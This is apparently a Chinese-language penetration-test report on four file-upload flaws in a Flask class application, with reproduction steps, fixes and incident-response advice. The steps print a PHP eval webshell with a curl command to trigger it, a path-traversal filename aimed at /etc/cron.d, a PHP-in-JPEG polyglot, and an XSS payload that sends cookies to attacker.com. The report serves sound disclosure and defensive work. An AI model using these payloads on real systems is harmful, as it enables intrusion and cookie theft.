# 文件上传安全漏洞测试报告

**测试日期**: 2026-07-21  
**测试系统**: /opt/Class01 Flask Web 应用  
**漏洞类型**: 文件上传相关漏洞  
**危害等级**: 严重

---

## 漏洞概述

经过全面测试，发现该系统存在**4个严重的文件上传安全漏洞**，攻击者可利用这些漏洞上传恶意文件、执行任意代码、覆盖系统文件，最终完全控制服务器。

---

## 漏洞详情

### 漏洞1: 无文件类型校验 - 任意文件上传

**危害程度**: 🔴 严重

#### 漏洞描述
系统对上传文件**完全没有类型检查**，允许用户上传任何类型的文件，包括可执行的脚本文件（.php、.jsp、.py、.sh等）、HTML文件、可执行文件等。

#### 漏洞路径/页面
- **上传页面**: `/upload`
- **后端处理**: `app.py` 第 207-228 行

#### 漏洞代码
```python
@app.route("/upload", methods=["GET", "POST"])
def upload():
    username = session.get("username")
    if not username:
        return redirect(url_for("login"))

    if request.method == "POST":
        file = request.files.get("file")
        if not file or file.filename == "":
            return render_template("upload.html", error="请选择要上传的文件")

        # ❌ 危险：没有任何文件类型检查！
        filename = file.filename
        save_path = os.path.join(UPLOAD_FOLDER, filename)
        file.save(save_path)  # 直接保存任意文件
```

#### 如何利用（复现步骤）

**步骤1**: 登录系统
```bash
# 使用测试账号登录
用户名: admin
密码: admin123
```

**步骤2**: 访问上传页面
```
http://localhost:5000/upload
```

**步骤3**: 上传恶意PHP文件
创建一个名为 `shell.php` 的文件，内容如下：
```php
<?php 
@eval($_POST['cmd']); 
echo "Webshell已激活";
?>
```

**步骤4**: 选择文件并上传
- 点击"选择文件"
- 选择 `shell.php`
- 点击"上传"

**步骤5**: 访问上传的文件
```
http://localhost:5000/static/uploads/shell.php
```

**步骤6**: 使用工具连接webshell
```bash
# 使用curl测试
curl -X POST http://localhost:5000/static/uploads/shell.php \
     -d "cmd=system('id');"
```

**实际测试证据**:
系统中已存在一个webshell文件：
- 文件路径: `/opt/Class01/static/uploads/147_pengxizhe_test12.php`
- 文件内容: `<?php @eval($_POST['12_147']); ?>`

这证明该漏洞**已被实际利用**！

#### 修复建议

1. **白名单校验文件扩展名**
```python
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'webp'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route("/upload", methods=["POST"])
def upload():
    file = request.files.get("file")
    if file and allowed_file(file.filename):
        # 继续处理
        pass
    else:
        return "只允许上传图片文件", 400
```

2. **校验文件MIME类型**
```python
from werkzeug.utils import secure_filename

ALLOWED_MIME_TYPES = {'image/png', 'image/jpeg', 'image/gif', 'image/webp'}

if file.mimetype not in ALLOWED_MIME_TYPES:
    return "文件类型不合法", 400
```

3. **检查文件内容（魔数验证）**
```python
import magic

def is_valid_image(file_path):
    mime = magic.from_file(file_path, mime=True)
    return mime in ALLOWED_MIME_TYPES
```

---

### 漏洞2: 路径遍历漏洞 - 任意文件写入

**危害程度**: 🔴 严重

#### 漏洞描述
系统**直接使用用户提供的文件名**，没有进行路径遍历检查。攻击者可以使用 `../` 等路径遍历字符将文件写入系统任意位置。

#### 漏洞路径/页面
- **上传页面**: `/upload`
- **后端处理**: `app.py` 第 220 行

#### 漏洞代码
```python
# ❌ 危险：直接使用用户文件名，未过滤路径遍历字符
filename = file.filename
save_path = os.path.join(UPLOAD_FOLDER, filename)
file.save(save_path)
```

#### 如何利用（复现步骤）

**步骤1**: 创建路径遍历测试文件
创建一个文件，文件名为：
```
../../etc/cron.d/malicious
```

文件内容（Linux定时任务）：
```bash
* * * * * root echo "pwned" > /tmp/pwned
```

**步骤2**: 上传该文件
- 访问 `/upload` 页面
- 选择刚才创建的文件
- 点击上传

**步骤3**: 验证文件写入位置
```bash
# 文件会被写入到 /opt/Class01/static/uploads/../../etc/cron.d/malicious
# 即 /etc/cron.d/malicious
ls -la /etc/cron.d/malicious
```

**替代测试方法**（更安全）:
```bash
# 创建测试文件，文件名为: ../../../tmp/test_path_traversal.txt
# 内容: "Path traversal successful"

# 上传后检查
cat /tmp/test_path_traversal.txt
```

#### 修复建议

1. **使用 secure_filename 过滤文件名**
```python
from werkzeug.utils import secure_filename

filename = secure_filename(file.filename)
# 会自动移除所有路径遍历字符
# "../../etc/passwd" -> "etc_passwd"
# "../../../tmp/test.txt" -> "tmp_test.txt"
```

2. **验证最终路径在预期目录内**
```python
import os

save_path = os.path.join(UPLOAD_FOLDER, secure_filename(file.filename))
real_path = os.path.realpath(save_path)

if not real_path.startswith(os.path.realpath(UPLOAD_FOLDER)):
    return "非法的文件路径", 400
```

3. **完整修复代码**
```python
from werkzeug.utils import secure_filename

@app.route("/upload", methods=["POST"])
def upload():
    file = request.files.get("file")
    if not file:
        return "未选择文件", 400
    
    # 1. 过滤文件名
    filename = secure_filename(file.filename)
    if not filename:
        return "无效的文件名", 400
    
    # 2. 验证文件类型
    if not allowed_file(filename):
        return "文件类型不允许", 400
    
    # 3. 验证路径
    save_path = os.path.join(UPLOAD_FOLDER, filename)
    real_path = os.path.realpath(save_path)
    if not real_path.startswith(os.path.realpath(UPLOAD_FOLDER)):
        return "非法的文件路径", 400
    
    # 4. 保存文件
    file.save(save_path)
```

---

### 漏洞3: 文件覆盖漏洞 - 任意文件替换

**危害程度**: 🟠 高危

#### 漏洞描述
系统**不检查文件是否已存在**，同名文件会被直接覆盖。攻击者可以：
- 覆盖其他用户上传的文件
- 覆盖系统关键文件（结合路径遍历）
- 进行拒绝服务攻击

#### 漏洞路径/页面
- **上传页面**: `/upload`
- **后端处理**: `app.py` 第 220-225 行

#### 漏洞代码
```python
# ❌ 危险：同名文件直接覆盖，无任何检查
filename = file.filename
save_path = os.path.join(UPLOAD_FOLDER, filename)
file.save(save_path)  # 直接覆盖已存在的文件
```

#### 如何利用（复现步骤）

**场景1: 覆盖其他用户的文件**

```bash
# 用户A上传文件 avatar.jpg
# 用户B知道文件名后，也上传一个同名文件 avatar.jpg
# 结果：用户A的文件被覆盖

# 实际测试
# 1. 使用admin账号上传 test.jpg
# 2. 使用alice账号上传同名 test.jpg（内容不同）
# 3. admin再次访问自己的文件，发现已被替换
```

**场景2: 覆盖系统静态文件**

```bash
# 上传文件名为: ../css/style.css
# 会覆盖系统的CSS样式文件
# 导致整个网站样式混乱（拒绝服务）
```

**场景3: 覆盖重要配置文件**

```bash
# 如果结合路径遍历漏洞
# 上传文件名为: ../../app.py
# 会覆盖主应用文件！
```

#### 修复建议

1. **重命名上传文件**
```python
import uuid
from werkzeug.utils import secure_filename

# 生成唯一文件名
original_filename = secure_filename(file.filename)
file_ext = original_filename.rsplit('.', 1)[1].lower() if '.' in original_filename else ''
new_filename = f"{uuid.uuid4().hex}.{file_ext}"
save_path = os.path.join(UPLOAD_FOLDER, new_filename)
```

2. **检查文件是否存在**
```python
if os.path.exists(save_path):
    # 选项1：拒绝上传
    return "文件已存在，请重命名后重试", 400
    
    # 选项2：自动重命名
    base, ext = os.path.splitext(save_path)
    counter = 1
    while os.path.exists(f"{base}_{counter}{ext}"):
        counter += 1
    save_path = f"{base}_{counter}{ext}"
```

3. **记录文件归属**
```python
# 在数据库记录文件上传者
file_record = {
    'filename': new_filename,
    'original_name': original_filename,
    'uploader': username,
    'upload_time': datetime.now()
}
# 只有上传者可以删除/覆盖自己的文件
```

---

### 漏洞4: 无文件大小和内容验证

**危害程度**: 🟠 高危

#### 漏洞描述
系统仅设置了16MB的最大上传限制，但**没有验证文件实际内容和大小**：
- 可以上传超大文件消耗磁盘空间
- 可以上传伪装成图片的恶意文件
- 可以上传包含恶意内容的文件（XSS、SQL注入载荷等）

#### 漏洞路径/页面
- **上传页面**: `/upload`
- **后端处理**: `app.py` 第 17 行、207-228 行

#### 漏洞代码
```python
# 仅设置了大小限制
app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024  # 16MB

# 但没有验证：
# ❌ 文件实际大小
# ❌ 文件内容是否合法
# ❌ 文件扩展名与内容是否匹配
```

#### 如何利用（复现步骤）

**测试1: 上传伪装成图片的HTML文件**

创建文件 `xss.jpg`，内容：
```html
<html>
<body>
<script>
// 窃取用户cookie
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
<img src="legitimate.jpg" onerror="alert('XSS')">
</body>
</html>
```

上传后访问：`http://localhost:5000/static/uploads/xss.jpg`
- 虽然扩展名是.jpg，但浏览器会将其解析为HTML
- 执行其中的JavaScript代码

**测试2: 上传包含恶意内容的图片**

```bash
# 创建一个包含PHP代码的"图片"
echo -e "\xff\xd8\xff\xe0<?php system('id'); ?>" > malicious.jpg

# 上传后，如果服务器配置不当，可能执行PHP代码
```

**测试3: 上传超大文件**

```bash
# 创建一个15MB的文件（接近限制）
dd if=/dev/zero of=large_file.jpg bs=1M count=15

# 多次上传，消耗服务器磁盘空间
```

#### 修复建议

1. **验证文件MIME类型和内容**
```python
import magic

ALLOWED_MIME_TYPES = {
    'image/jpeg': ['jpg', 'jpeg'],
    'image/png': ['png'],
    'image/gif': ['gif'],
    'image/webp': ['webp']
}

def validate_file_content(file_path, claimed_extension):
    """验证文件内容是否与扩展名匹配"""
    actual_mime = magic.from_file(file_path, mime=True)
    
    if actual_mime not in ALLOWED_MIME_TYPES:
        return False, "不支持的文件类型"
    
    allowed_extensions = ALLOWED_MIME_TYPES[actual_mime]
    if claimed_extension.lower() not in allowed_extensions:
        return False, "文件扩展名与内容不匹配"
    
    return True, None
```

2. **限制实际文件大小**
```python
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

# 检查文件大小
file.seek(0, 2)  # 移动到文件末尾
file_size = file.tell()
file.seek(0)  # 重置文件指针

if file_size > MAX_FILE_SIZE:
    return "文件大小超过限制", 400
```

3. **图片文件重新处理**
```python
from PIL import Image
import io

def sanitize_image(file_stream):
    """重新处理图片，移除可能的恶意代码"""
    try:
        img = Image.open(file_stream)
        img.verify()  # 验证是否为有效图片
        
        # 重新保存图片，去除嵌入的恶意代码
        img = Image.open(file_stream)
        output = io.BytesIO()
        img.save(output, format=img.format)
        output.seek(0)
        return output, None
    except Exception as e:
        return None, f"无效的图片文件: {str(e)}"
```

4. **设置磁盘配额和清理机制**
```python
import shutil

# 检查磁盘空间
total, used, free = shutil.disk_usage(UPLOAD_FOLDER)
if free < 1024 * 1024 * 1024:  # 小于1GB
    return "服务器存储空间不足", 507

# 定期清理旧文件
# 可以使用cron任务或后台线程
```

---

## 综合修复方案

### 完整的文件上传安全实现

```python
import os
import uuid
import magic
from PIL import Image
from werkzeug.utils import secure_filename
from flask import current_app

# 配置
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'webp'}
ALLOWED_MIME_TYPES = {
    'image/png': ['png'],
    'image/jpeg': ['jpg', 'jpeg'],
    'image/gif': ['gif'],
    'image/webp': ['webp']
}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def allowed_file(filename):
    """检查文件扩展名"""
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def validate_file_content(file_stream, filename):
    """验证文件内容"""
    # 1. 检查文件大小
    file_stream.seek(0, 2)
    file_size = file_stream.tell()
    file_stream.seek(0)
    
    if file_size > MAX_FILE_SIZE:
        return None, "文件大小超过5MB限制"
    
    if file_size == 0:
        return None, "文件为空"
    
    # 2. 检查MIME类型
    content = file_stream.read()
    file_stream.seek(0)
    
    actual_mime = magic.from_buffer(content, mime=True)
    if actual_mime not in ALLOWED_MIME_TYPES:
        return None, "不支持的文件类型"
    
    # 3. 验证扩展名与MIME类型匹配
    ext = filename.rsplit('.', 1)[1].lower()
    if ext not in ALLOWED_MIME_TYPES[actual_mime]:
        return None, "文件扩展名与内容不匹配"
    
    # 4. 重新处理图片（去除恶意代码）
    try:
        from io import BytesIO
        img = Image.open(BytesIO(content))
        img.verify()
        
        # 重新保存
        img = Image.open(BytesIO(content))
        output = BytesIO()
        img.save(output, format=img.format, quality=85)
        output.seek(0)
        
        return output, None
    except Exception as e:
        return None, f"无效的图片文件: {str(e)}"

@app.route("/upload", methods=["GET", "POST"])
def upload():
    username = session.get("username")
    if not username:
        return redirect(url_for("login"))

    if request.method == "POST":
        file = request.files.get("file")
        if not file or file.filename == "":
            return render_template("upload.html", error="请选择要上传的文件")

        # 1. 过滤文件名
        original_filename = secure_filename(file.filename)
        if not original_filename:
            return render_template("upload.html", error="无效的文件名")

        # 2. 检查扩展名
        if not allowed_file(original_filename):
            return render_template(
                "upload.html", 
                error=f"只允许上传 {', '.join(ALLOWED_EXTENSIONS)} 格式的图片"
            )

        # 3. 验证文件内容
        sanitized_content, error = validate_file_content(file.stream, original_filename)
        if error:
            return render_template("upload.html", error=error)

        # 4. 生成安全的文件名
        ext = original_filename.rsplit('.', 1)[1].lower()
        safe_filename = f"{uuid.uuid4().hex}.{ext}"
        save_path = os.path.join(UPLOAD_FOLDER, safe_filename)

        # 5. 验证最终路径
        real_path = os.path.realpath(save_path)
        if not real_path.startswith(os.path.realpath(UPLOAD_FOLDER)):
            return render_template("upload.html", error="非法的文件路径")

        # 6. 保存文件
        with open(save_path, 'wb') as f:
            f.write(sanitized_content.read())

        # 7. 记录文件信息（可选）
        # save_file_record(username, safe_filename, original_filename)

        file_url = url_for("static", filename=f"uploads/{safe_filename}")
        return render_template(
            "upload.html", 
            success=True, 
            file_url=file_url, 
            filename=original_filename
        )

    return render_template("upload.html")
```

---

## 测试总结

| 漏洞编号 | 漏洞名称 | 危害等级 | 状态 |
|---------|---------|---------|------|
| 1 | 无文件类型校验 | 🔴 严重 | 已验证，存在实际利用证据 |
| 2 | 路径遍历漏洞 | 🔴 严重 | 可复现 |
| 3 | 文件覆盖漏洞 | 🟠 高危 | 可复现 |
| 4 | 无内容验证 | 🟠 高危 | 可复现 |

**总体评估**: 系统的文件上传功能存在**严重安全隐患**，已被实际利用（发现webshell文件）。建议**立即修复**所有漏洞，并检查服务器是否已被入侵。

---

## 紧急建议

1. **立即删除已发现的webshell文件**:
   ```bash
   rm /opt/Class01/static/uploads/147_pengxizhe_test12.php
   rm /opt/Class01/static/uploads/147_pengxizhe_test12.jpg
   ```

2. **检查服务器日志**，查看是否有其他恶意文件被上传

3. **检查系统是否被入侵**：
   - 查看定时任务: `crontab -l`
   - 检查异常进程: `ps aux`
   - 检查网络连接: `netstat -tlnp`

4. **立即应用上述修复方案**

5. **考虑添加WAF（Web应用防火墙）**提供额外保护
